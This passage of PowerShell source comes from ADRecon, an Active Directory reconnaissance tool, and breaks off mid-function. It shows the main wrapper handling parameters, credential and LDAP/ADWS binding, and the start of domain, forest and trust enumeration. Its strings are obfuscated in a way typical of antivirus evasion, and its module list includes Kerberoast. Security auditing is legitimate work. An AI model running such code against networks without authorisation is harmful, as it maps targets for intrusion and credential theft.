    $AboutADRecon = @()

    $Version = $Method + ("{1}{2}{0}" -f 'sion',' Ve','r')

    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
    {
        $Username = $($Credential.UserName)
    }
    Else
    {
        $Username = $([Environment]::UserName)
    }

    $ObjValues = @(("{1}{0}"-f'ate','D'), $($date), ("{0}{2}{1}"-f 'A','con','DRe'), ("{7}{5}{6}{3}{8}{2}{1}{0}{9}{4}"-f'on','c','re','co','con',':','//github.','https','m/ad','/ADRe'), $Version, $($ADReconVersion), ("{3}{2}{0}{1}"-f 'u','ser','s ','Ran a'), $Username, ("{2}{3}{0}{1}" -f'ute','r','Ran on ','comp'), $RanonComputer, ("{0}{2}{3}{1}{4}" -f 'Exec','e (mins','u','tion Tim',')'), $($TotalTime))

    For ($i = 0; $i -lt $($ObjValues.Count); $i++)
    {
        $Obj = New-Object PSObject
        $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}"-f'ry','tego','Ca') -Value $ObjValues[$i]
        $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'ue','Val') -Value $ObjValues[$i+1]
        $i++
        $AboutADRecon += $Obj
    }
    Return $AboutADRecon
}

Function Invoke-ADRecon
{
<#
.SYNOPSIS
    Wrapper function to run ADRecon modules.

.DESCRIPTION
    Wrapper function to set variables, check dependencies and run ADRecon modules.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER Collect
    [array]
    Which modules to run; Tenant, Forest, Domain, Trusts, Sites, Subnets, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupMembers, GroupChanges, OUs, GPOs, gPLinks, DNSZones, Printers, Computers, ComputerSPNs, LAPS, BitLocker, ACLs, GPOReport, Kerberoast, DomainAccountsusedforServiceLogon.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER OutputDir
    [string]
	Path for ADRecon output folder to save the CSV files and the ADRecon-Report.xlsx.

.PARAMETER DormantTimeSpan
    [int]
    Timespan for Dormant accounts. Default 90 days.

.PARAMTER PassMaxAge
    [int]
    Maximum machine account password age. Default 30 days

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.PARAMETER UseAltCreds
    [bool]
    Whether to use provided credentials or not.

.OUTPUTS
    STDOUT, CSV, XML, JSON, HTML and/or Excel file is created in the folder specified with the information.
#>
    param(
        [Parameter(Mandatory = $false)]
        [string] $GenExcel,

        [Parameter(Mandatory = $false)]
        [ValidateSet({"{0}{1}" -f 'A','DWS'}, {"{0}{1}" -f 'L','DAP'})]
        [string] $Method = ("{0}{1}"-f'ADW','S'),

        [Parameter(Mandatory = $true)]
        [array] $Collect,

        [Parameter(Mandatory = $false)]
        [string] $DomainController = '',

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [array] $OutputType,

        [Parameter(Mandatory = $false)]
        [string] $ADROutputDir,

        [Parameter(Mandatory = $false)]
        [int] $DormantTimeSpan = 90,

        [Parameter(Mandatory = $false)]
        [int] $PassMaxAge = 30,

        [Parameter(Mandatory = $false)]
        [int] $PageSize = 200,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10,

        [Parameter(Mandatory = $false)]
        [bool] $UseAltCreds = $false
    )

    [string] $ADReconVersion = ("{1}{0}" -f '.24','v1')
    Write-Output ('['+'*] '+'ADRecon'+' '+"$ADReconVersion "+'by'+' '+'Pr'+'ashan'+'t '+'M'+'ahaj'+'an '+'('+'@pr'+'a'+'sha'+'nt3535)')

    If ($GenExcel)
    {
        If (!(Test-Path $GenExcel))
        {
            Write-Output ("{5}{4}{9}{8}{10}{6}{12}{7}{0}{11}{2}{3}{1}"-f'Pa','ing',' ...',' Exit','I','[','n] ','nvalid ','ke-','nvo','ADReco','th','I')
            Return $null
        }
        Export-ADRExcel -ExcelPath $GenExcel
        Return $null
    }

    # Suppress verbose output
    $SaveVerbosePreference = $script:VerbosePreference
    $script:VerbosePreference = ("{0}{1}{2}{3}{4}"-f 'S','i','lently','Co','ntinue')
    Try
    {
        If ($PSVersionTable.PSVersion.Major -ne 2)
        {
            $computer = Get-CimInstance -ClassName Win32_ComputerSystem
            $computerdomainrole = ($computer).DomainRole
        }
        Else
        {
            $computer = Get-WMIObject win32_computersystem
            $computerdomainrole = ($computer).DomainRole
        }
    }
    Catch
    {
        Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
    }
    If ($SaveVerbosePreference)
    {
        $script:VerbosePreference = $SaveVerbosePreference
        Remove-Variable SaveVerbosePreference
    }

    switch ($computerdomainrole)
    {
        0
        {
            [string] $computerrole = ("{0}{1}{3}{2}" -f 'Standalone ','W','tation','orks')
            $Env:ADPS_LoadDefaultDrive = 0
            $UseAltCreds = $true
        }
        1 { [string] $computerrole = ("{3}{4}{2}{1}{0}" -f'ion','orkstat','r W','Memb','e') }
        2
        {
            [string] $computerrole = ("{2}{0}{3}{1}" -f'nd','ver','Sta','alone Ser')
            $UseAltCreds = $true
            $Env:ADPS_LoadDefaultDrive = 0
        }
        3 { [string] $computerrole = ("{0}{1}{2}{3}"-f 'Member ','S','er','ver') }
        4 { [string] $computerrole = ("{7}{3}{4}{6}{0}{2}{5}{1}" -f 'C','roller','on','ackup',' D','t','omain ','B') }
        5 { [string] $computerrole = ("{2}{0}{4}{1}{3}"-f 'imary ','omain Control','Pr','ler','D') }
        default { Write-Output ("{2}{1}{5}{3}{7}{8}{4}{6}{0}"-f 'be identified.','mput','Co','u','o','er Role co','t ','ld ','n') }
    }

    $RanonComputer = "$($computer.domain)\$([Environment]::MachineName) - $($computerrole) "
    Remove-Variable computer
    Remove-Variable computerdomainrole
    Remove-Variable computerrole

    # If either DomainController or Credentials are provided, treat as non-member
    If (($DomainController -ne "") -or ($Credential -ne [Management.Automation.PSCredential]::Empty))
    {
        # Disable loading of default drive on member
        If (($Method -eq ("{0}{1}"-f 'AD','WS')) -and (-Not $UseAltCreds))
        {
            $Env:ADPS_LoadDefaultDrive = 0
        }
        $UseAltCreds = $true
    }

    # Import ActiveDirectory module
    If ($Method -eq ("{1}{0}"-f'S','ADW'))
    {
        If (Get-Module -ListAvailable -Name ActiveDirectory)
        {
            Try
            {
                # Suppress verbose output on module import
                $SaveVerbosePreference = $script:VerbosePreference;
                $script:VerbosePreference = ("{1}{0}{2}"-f'entlyContin','Sil','ue');
                Import-Module ActiveDirectory -WarningAction Stop -ErrorAction Stop | Out-Null
                If ($SaveVerbosePreference)
                {
                    $script:VerbosePreference = $SaveVerbosePreference
                    Remove-Variable SaveVerbosePreference
                }
            }
            Catch
            {
                Write-Warning ("{17}{19}{11}{8}{9}{2}{13}{3}{7}{0}{4}{1}{14}{10}{5}{15}{12}{16}{18}{6}" -f'T (','m','eDir',' Module from R','Re','m','inuing with LDAP','SA','g Act','iv','erver Ad','] Error importin',') ','ectory','ote S','inistration Tools','... C','[Invo','ont','ke-ADRecon')
                $Method = ("{1}{0}"-f 'AP','LD')
                If ($SaveVerbosePreference)
                {
                    $script:VerbosePreference = $SaveVerbosePreference
                    Remove-Variable SaveVerbosePreference
                }
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
        }
        Else
        {
            Write-Warning (("{20}{4}{29}{11}{0}{19}{6}{15}{28}{23}{22}{34}{21}{33}{24}{26}{30}{17}{35}{13}{3}{2}{25}{5}{7}{8}{18}{14}{32}{1}{27}{16}{31}{10}{12}{9}" -f 'veDir','led ... Co','a','tr','o','ools','ct',') is',' ','P','i','ti','th LDA','s','s','o','u','i','not in','e','[Inv','AT (R','o','r',' Se','tion T','rver','ntin','ry Module f','ke-ADRecon] Ac',' Adm','ing w','tal','emote','m RS','ni'))
            $Method = ("{1}{0}"-f'P','LDA')
        }
    }

    # Compile C# code
    # Suppress Debug output
    $SaveDebugPreference = $script:DebugPreference
    $script:DebugPreference = ("{1}{3}{0}{2}" -f 'on','Sile','tinue','ntlyC')
    Try
    {
        $Advapi32 = Add-Type -MemberDefinition $Advapi32Def -Name ("{0}{1}{2}" -f 'A','dvapi','32') -Namespace ADRecon -PassThru
        $Kernel32 = Add-Type -MemberDefinition $Kernel32Def -Name ("{2}{0}{1}"-f 'nel','32','Ker') -Namespace ADRecon -PassThru
        #Add-Type -TypeDefinition $PingCastleSMBScannerSource
        $CLR = ([System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion)[1]
        If ($Method -eq ("{1}{0}" -f 'S','ADW'))
        {
            <#
            If ($PSVersionTable.PSEdition -eq "Core")
            {
                $refFolder = Join-Path -Path (Split-Path([PSObject].Assembly.Location)) -ChildPath "ref"
                Add-Type -TypeDefinition $($ADWSSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices")).Location
                    (Join-Path -Path $refFolder -ChildPath "System.Linq.dll")
                    #([System.Reflection.Assembly]::LoadWithPartialName("System.Linq")).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")).Location
                    (Join-Path -Path $refFolder -ChildPath "System.Collections.dll")
                    (Join-Path -Path $refFolder -ChildPath "System.Collections.NonGeneric.dll")
                    (Join-Path -Path $refFolder -ChildPath "mscorlib.dll")
                    (Join-Path -Path $refFolder -ChildPath "netstandard.dll")
                    (Join-Path -Path $refFolder -ChildPath "System.Runtime.Extensions.dll")
                    #([System.Reflection.Assembly]::LoadWithPartialName("System.Collections")).Location
                    #([System.Reflection.Assembly]::LoadWithPartialName("System.Collections.NonGeneric")).Location
                    #([System.Reflection.Assembly]::LoadWithPartialName("mscorlib")).Location
                    #([System.Reflection.Assembly]::LoadWithPartialName("netstandard")).Location
                    #([System.Reflection.Assembly]::LoadWithPartialName("System.Runtime.Extensions")).Location
                    (Join-Path -Path $refFolder -ChildPath "System.Threading.dll")
                    (Join-Path -Path $refFolder -ChildPath "System.Threading.Thread.dll")
                    (Join-Path -Path $refFolder -ChildPath "System.Console.dll")
                    (Join-Path -Path $refFolder -ChildPath "System.Diagnostics.TraceSource.dll")
                    ([System.Reflection.Assembly]::LoadWithPartialName("Microsoft.ActiveDirectory.Management")).Location
                    (Join-Path -Path $refFolder -ChildPath "System.Net.Primitives.dll")
                    ([System.Reflection.Assembly]::LoadWithPartialName("System.Security.AccessControl")).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName("System.IO.FileSystem.AccessControl")).Location
                    #(Join-Path -Path $refFolder -ChildPath "System.Security.dll")
                    #(Join-Path -Path $refFolder -ChildPath "System.Security.Principal.dll")
                    ([System.Reflection.Assembly]::LoadWithPartialName("System.Security.Principal")).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName("System.Security.Principal.Windows")).Location
                    (Join-Path -Path $refFolder -ChildPath "System.Xml.dll")
                    (Join-Path -Path $refFolder -ChildPath "System.Xml.XmlDocument.dll")
                    (Join-Path -Path $refFolder -ChildPath "System.Xml.ReaderWriter.dll")
                    #([System.Reflection.Assembly]::LoadWithPartialName("System.XML")).Location
                    (Join-Path -Path $refFolder -ChildPath "System.Net.Sockets.dll")
                    #([System.Reflection.Assembly]::LoadWithPartialName("System.Runtime")).Location
                    #(Join-Path -Path $refFolder -ChildPath "System.Runtime.dll")
                    #(Join-Path -Path $refFolder -ChildPath "System.Runtime.InteropServices.RuntimeInformation.dll")
                ))
                Remove-Variable refFolder
                # Todo Error: you may need to supply runtime policy
            }
            #>
            If ($CLR -eq "4")
            {
                Add-Type -TypeDefinition $($ADWSSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName(("{7}{2}{6}{1}{9}{5}{3}{8}{0}{4}"-f 'ageme','ve','icroso','.Ma','nt','irectory','ft.Acti','M','n','D'))).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(("{1}{3}{2}{5}{0}{4}{6}"-f 'ervi','System.Direc','y','tor','c','S','es'))).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(("{0}{3}{1}{2}"-f 'System.','M','L','X'))).Location
                ))
            }
            Else
            {
                Add-Type -TypeDefinition $($ADWSSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName(("{6}{4}{8}{9}{2}{3}{5}{0}{7}{1}" -f'ire','ment','t.A','ctiv','i','eD','M','ctory.Manage','cros','of'))).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(("{0}{1}{5}{4}{3}{2}"-f'Syst','em','ices','v','ctorySer','.Dire'))).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(("{0}{2}{1}"-f 'S','em.XML','yst'))).Location
                )) -Language CSharpVersion3
            }
        }

        If ($Method -eq ("{0}{1}"-f 'LD','AP'))
        {
            If ($CLR -eq "4")
            {
                Add-Type -TypeDefinition $($LDAPSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName(("{0}{5}{4}{2}{6}{3}{1}"-f'Syst','es','ry','ic','.Directo','em','Serv'))).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(("{2}{0}{1}" -f 'em.','XML','Syst'))).Location
                ))
            }
            Else
            {
                Add-Type -TypeDefinition $($LDAPSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ([System.Reflection.Assembly]::LoadWithPartialName(("{2}{1}{0}{5}{6}{4}{7}{3}" -f 'rect','m.Di','Syste','ces','e','ory','S','rvi'))).Location
                    ([System.Reflection.Assembly]::LoadWithPartialName(("{1}{2}{3}{0}"-f 'ML','Sys','tem.','X'))).Location
                )) -Language CSharpVersion3
            }
        }
    }
    Catch
    {
        Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
        Return $null
    }
    If ($SaveDebugPreference)
    {
        $script:DebugPreference = $SaveDebugPreference
        Remove-Variable SaveDebugPreference
    }

    # Allow running using RUNAS from a non-domain joined machine
    # runas /user:<Domain FQDN>\<Username> /netonly powershell.exe
    If (($Method -eq ("{0}{1}" -f'LD','AP')) -and ($UseAltCreds) -and ($DomainController -eq "") -and ($Credential -eq [Management.Automation.PSCredential]::Empty))
    {
        Try
        {
            $objDomain = [ADSI]""
            If(!($objDomain.name))
            {
                Write-Verbose ("{1}{7}{10}{9}{8}{2}{4}{6}{3}{5}{0}"-f'sful','[','R','AP bin','UNAS','d Unsucces',' Check, LD','Inv','on] ','ke-ADRec','o')
            }
            $UseAltCreds = $false
            $objDomain.Dispose()
        }
        Catch
        {
            $UseAltCreds = $true
        }
    }

    If ($UseAltCreds -and (($DomainController -eq "") -or ($Credential -eq [Management.Automation.PSCredential]::Empty)))
    {

        If (($DomainController -ne "") -and ($Credential -eq [Management.Automation.PSCredential]::Empty))
        {
            Try
            {
                $Credential = Get-Credential
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
                Return $null
            }
        }
        Else
        {
            Write-Output ((("{15}{4}{5}{0}{1}{10}{6}{11}{7}{18}{3}{9}{2}{12}{13}{8}{14}{17}{16}"-f't-','Help .z',' a','-E','n ','Ge','QA','n','al ','xamples for','c','DReco','dditi','on','inf','Ru','n.','ormatio','.ps1 '))  -CrEpLACe'zcQ',[cHar]92)
            Write-Output ("{9}{7}{0}{3}{12}{5}{6}{8}{1}{11}{4}{2}{10}" -f't','ar','t','he -D','e','mainController and ','-','voke-ADRecon] Use ','Credential p','[In','er.','am','o')`n
            Return $null
        }
    }

    Write-Output ('[*]'+' '+'Runni'+'ng'+' '+'o'+'n '+"$RanonComputer")

    Switch ($Collect)
    {
        ("{1}{0}"-f't','Fores') { $ADRForest = $true }
        ("{1}{0}{2}" -f'a','Dom','in') {$ADRDomain = $true }
        ("{2}{1}{0}" -f'sts','u','Tr') { $ADRTrust = $true }
        ("{0}{1}" -f 'Si','tes') { $ADRSite = $true }
        ("{1}{0}" -f 'ets','Subn') { $ADRSubnet = $true }
        ("{1}{3}{4}{0}{2}" -f 'Histor','S','y','che','ma') { $ADRSchemaHistory = $true }
        ("{2}{0}{1}"-f 'a','sswordPolicy','P') { $ADRPasswordPolicy = $true }
        ("{0}{4}{2}{3}{1}" -f'FineGra','sswordPolicy','edP','a','in') { $ADRFineGrainedPasswordPolicy = $true }
        ("{3}{0}{4}{2}{1}"-f'm','lers','rol','Do','ainCont') { $ADRDomainControllers = $true }
        ("{0}{1}"-f'User','s') { $ADRUsers = $true }
        ("{1}{0}" -f'rSPNs','Use') { $ADRUserSPNs = $true }
        ("{5}{3}{4}{0}{2}{1}" -f'b','tes','u','rdAtt','ri','Passwo') { $ADRPasswordAttributes = $true }
        ("{1}{0}{2}" -f'up','Gro','s') {$ADRGroups = $true }
        ("{1}{2}{0}{3}"-f 'Cha','Gr','oup','nges') { $ADRGroupChanges = $true }
        ("{1}{2}{3}{0}"-f 'bers','Gro','upM','em') { $ADRGroupMembers = $true }
        'OUs' { $ADROUs = $true }
        ("{1}{0}"-f 's','GPO') { $ADRGPOs = $true }
        ("{2}{0}{1}" -f'PL','inks','g') { $ADRgPLinks = $true }
        ("{0}{1}{2}"-f'DNSZon','e','s') { $ADRDNSZones = $true }
        ("{2}{0}{1}" -f 'c','ords','DNSRe') { $ADRDNSRecords = $true }
        ("{2}{1}{0}" -f 'ers','int','Pr') { $ADRPrinters = $true }
        ("{0}{2}{1}"-f'Compu','s','ter') { $ADRComputers = $true }
        ("{2}{3}{1}{0}"-f'PNs','rS','Co','mpute') { $ADRComputerSPNs = $true }
        ("{1}{0}"-f'S','LAP') { $ADRLAPS = $true }
        ("{0}{3}{1}{2}"-f'Bit','ke','r','Loc') { $ADRBitLocker = $true }
        ("{0}{1}"-f'A','CLs') { $ADRACLs = $true }
        ("{0}{1}{2}" -f 'GPOR','epo','rt')
        {
            $ADRGPOReport = $true
            $ADRCreate = $true
        }
        ("{1}{2}{0}" -f'st','Kerber','oa') { $ADRKerberoast = $true }
        ("{1}{5}{3}{4}{0}{2}"-f'dforSe','Doma','rviceLogon','nAc','countsuse','i') { $ADRDomainAccountsusedforServiceLogon = $true }
        ("{0}{2}{1}" -f'D','fault','e')
        {
            $ADRForest = $true
            $ADRDomain = $true
            $ADRTrust = $true
            $ADRSite = $true
            $ADRSubnet = $true
            $ADRSchemaHistory = $true
            $ADRPasswordPolicy = $true
            $ADRFineGrainedPasswordPolicy = $true
            $ADRDomainControllers = $true
            $ADRUsers = $true
            $ADRUserSPNs = $true
            $ADRPasswordAttributes = $true
            $ADRGroups = $true
            $ADRGroupMembers = $true
            $ADRGroupChanges = $true
            $ADROUs = $true
            $ADRGPOs = $true
            $ADRgPLinks = $true
            $ADRDNSZones = $true
            $ADRDNSRecords = $true
            $ADRPrinters = $true
            $ADRComputers = $true
            $ADRComputerSPNs = $true
            $ADRLAPS = $true
            $ADRBitLocker = $true
            #$ADRACLs = $true
            $ADRGPOReport = $true
            #$ADRKerberoast = $true
            #$ADRDomainAccountsusedforServiceLogon = $true

            If ($OutputType -eq ("{1}{0}"-f'efault','D'))
            {
                [array] $OutputType = "CSV",("{0}{1}"-f'Exc','el')
            }
        }
    }

    Switch ($OutputType)
    {
        ("{1}{0}"-f 'UT','STDO') { $ADRSTDOUT = $true }
        'CSV'
        {
            $ADRCSV = $true
            $ADRCreate = $true
        }
        'XML'
        {
            $ADRXML = $true
            $ADRCreate = $true
        }
        ("{0}{1}" -f'JS','ON')
        {
            $ADRJSON = $true
            $ADRCreate = $true
        }
        ("{1}{0}" -f 'TML','H')
        {
            $ADRHTML = $true
            $ADRCreate = $true
        }
        ("{1}{0}"-f 'el','Exc')
        {
            $ADRExcel = $true
            $ADRCreate = $true
        }
        'All'
        {
            #$ADRSTDOUT = $true
            $ADRCSV = $true
            $ADRXML = $true
            $ADRJSON = $true
            $ADRHTML = $true
            $ADRExcel = $true
            $ADRCreate = $true
            [array] $OutputType = "CSV","XML",("{0}{1}"-f'JS','ON'),("{1}{0}" -f 'ML','HT'),("{1}{0}" -f'xcel','E')
        }
        ("{1}{2}{0}"-f 'lt','De','fau')
        {
            [array] $OutputType = {"{0}{1}"-f 'STD','OUT'}
            $ADRSTDOUT = $true
        }
    }

    If ( ($ADRExcel) -and (-Not $ADRCSV) )
    {
        $ADRCSV = $true
        [array] $OutputType += "CSV"
    }

    $returndir = Get-Location
    $date = Get-Date

    # Create Output dir
    If ( ($ADROutputDir) -and ($ADRCreate) )
    {
        If (!(Test-Path $ADROutputDir))
        {
            New-Item $ADROutputDir -type directory | Out-Null
            If (!(Test-Path $ADROutputDir))
            {
                Write-Output ("{6}{9}{2}{3}{5}{7}{0}{1}{8}{4}" -f 'put','D','on] Error,',' in','.. Exiting','v','[Inv','alid Out','ir Path .','oke-ADRec')
                Return $null
            }
        }
        $ADROutputDir = $((Convert-Path $ADROutputDir).TrimEnd("\"))
        Write-Verbose ('[*]'+' '+'Out'+'put '+'Direct'+'o'+'ry: '+"$ADROutputDir")
    }
    ElseIf ($ADRCreate)
    {
        $ADROutputDir =  -join($returndir,'\',("{0}{3}{1}{2}"-f 'ADReco','Re','port-','n-'),$(Get-Date -UFormat %Y%m%d%H%M%S))
        New-Item $ADROutputDir -type directory | Out-Null
        If (!(Test-Path $ADROutputDir))
        {
            Write-Output ("{2}{15}{5}{17}{9}{8}{6}{0}{13}{12}{3}{14}{4}{1}{7}{11}{16}{10}"-f'ror, coul','d','[',' crea','put ','e',' Er','irec','n]','co','y','t','not','d ','te out','Invok','or','-ADRe')
            Return $null
        }
        $ADROutputDir = $((Convert-Path $ADROutputDir).TrimEnd("\"))
        Remove-Variable ADRCreate
    }
    Else
    {
        $ADROutputDir = $returndir
    }

    If ($ADRCSV)
    {
        $CSVPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\',("{1}{2}{0}"-f'iles','C','SV-F'))
        New-Item $CSVPath -type directory | Out-Null
        If (!(Test-Path $CSVPath))
        {
            Write-Output ("{5}{0}{1}{6}{9}{10}{2}{7}{8}{4}{3}" -f 'oke-ADRecon] E','r','a','directory','ut ','[Inv','ror, could','te',' outp',' not cr','e')
            Return $null
        }
        Remove-Variable ADRCSV
    }

    If ($ADRXML)
    {
        $XMLPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\',("{1}{0}{2}"-f 'L-File','XM','s'))
        New-Item $XMLPath -type directory | Out-Null
        If (!(Test-Path $XMLPath))
        {
            Write-Output ("{4}{14}{0}{1}{11}{9}{13}{8}{16}{10}{15}{12}{3}{6}{7}{2}{5}" -f 'k','e-A','ctor','utput ','[Inv','y','di','re','uld n','Er',' ','DRecon] ','eate o','ror, co','o','cr','ot')
            Return $null
        }
        Remove-Variable ADRXML
    }

    If ($ADRJSON)
    {
        $JSONPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\',("{2}{1}{0}" -f '-Files','SON','J'))
        New-Item $JSONPath -type directory | Out-Null
        If (!(Test-Path $JSONPath))
        {
            Write-Output ("{7}{8}{2}{6}{10}{0}{5}{9}{4}{1}{3}"-f'oul','irect','-ADRecon] ','ory',' d','d not c','Error','[','Invoke','reate output',', c')
            Return $null
        }
        Remove-Variable ADRJSON
    }

    If ($ADRHTML)
    {
        $HTMLPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\',("{2}{1}{0}"-f 'iles','-F','HTML'))
        New-Item $HTMLPath -type directory | Out-Null
        If (!(Test-Path $HTMLPath))
        {
            Write-Output ("{3}{14}{2}{10}{11}{13}{6}{5}{12}{0}{4}{8}{7}{9}{1}"-f 'ul','y','v','[','d no',' ','r,','r','t c','eate output director','oke','-ADRecon]','co',' Erro','In')
            Return $null
        }
        Remove-Variable ADRHTML
    }

    # AD Login
    If ($UseAltCreds -and ($Method -eq ("{1}{0}"-f'S','ADW')))
    {
        If (!(Test-Path ADR:))
        {
            Try
            {
                New-PSDrive -PSProvider ActiveDirectory -Name ADR -Root "" -Server $DomainController -Credential $Credential -ErrorAction Stop | Out-Null
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Else
        {
            Remove-PSDrive ADR
            Try
            {
                New-PSDrive -PSProvider ActiveDirectory -Name ADR -Root "" -Server $DomainController -Credential $Credential -ErrorAction Stop | Out-Null
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Set-Location ADR:
        Write-Debug ("{1}{2}{3}{0}{4}"-f'ate','AD','R',' PSDrive Cre','d')
    }

    If ($Method -eq ("{0}{1}"-f 'L','DAP'))
    {
        If ($UseAltCreds)
        {
            Try
            {
                $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objDomainRootDSE = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/RootDSE", $Credential.UserName,$Credential.GetNetworkCredential().Password
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
            If(!($objDomain.name))
            {
                Write-Output ("{9}{10}{11}{1}{5}{6}{3}{8}{7}{2}{0}{4}" -f 'cces','vok','AP bind Unsu','n]','sful','e-ADRec','o','D',' L','[','I','n')
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
            Else
            {
                Write-Output ("{0}{5}{2}{4}{6}{3}{1}" -f'[*','sful','LDAP bi',' Succes','n','] ','d')
            }
        }
        Else
        {
            $objDomain = [ADSI]""
            $objDomainRootDSE = ([ADSI] ("{1}{4}{2}{3}{0}" -f 'E','LD','t','DS','AP://Roo'))
            If(!($objDomain.name))
            {
                Write-Output ("{5}{6}{2}{11}{1}{4}{7}{3}{0}{9}{8}{10}"-f 'ce','econ] LD','v','d Unsuc','AP bi','[','In','n','sf','s','ul','oke-ADR')
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Write-Debug ("{4}{1}{0}{2}{3}" -f ' B','AP','ing Su','ccessful','LD')
    }

    Write-Output ('[*]'+' '+'C'+'o'+'mmenc'+'ing '+'- '+"$date")
    If ($ADRDomain)
    {
        Write-Output ("{1}{0}{2}"-f'-]','[',' Domain')
        $ADRObject = Get-ADRDomain -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}{2}"-f'Do','m','ain')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomain
    }
    If ($ADRForest)
    {
        Write-Output ("{0}{1}{2}"-f '[-] F','o','rest')
        $ADRObject = Get-ADRForest -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{0}{2}" -f'e','For','st')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRForest
    }
    If ($ADRTrust)
    {
        Write-Output ("{1}{0}{2}"-f 'ust','[-] Tr','s')
        $ADRObject = Get-ADRTrust -Method $Method -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{0}{2}"-f 'st','Tru','s')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRTrust
    }
    If ($ADRSite)
    {
        Write-Output ("{2}{1}{0}"-f '] Sites','-','[')
        $ADRObject = Get-ADRSite -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}"-f'S','ites')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSite
    }
    If ($ADRSubnet)
    {
        Write-Output ("{3}{1}{0}{2}"-f'ubne','] S','ts','[-')
        $ADRObject = Get-ADRSubnet -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{2}{1}{0}" -f 'nets','b','Su')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSubnet
    }
    If ($ADRSchemaHistory)
    {
        Write-Output ("{6}{3}{2}{5}{1}{0}{4}" -f 't',' - May take some ','aHisto','m','ime','ry','[-] Sche')
        $ADRObject = Get-ADRSchemaHistory -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{3}{0}{2}{1}"-f'hemaHisto','y','r','Sc')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSchemaHistory
    }
    If ($ADRPasswordPolicy)
    {
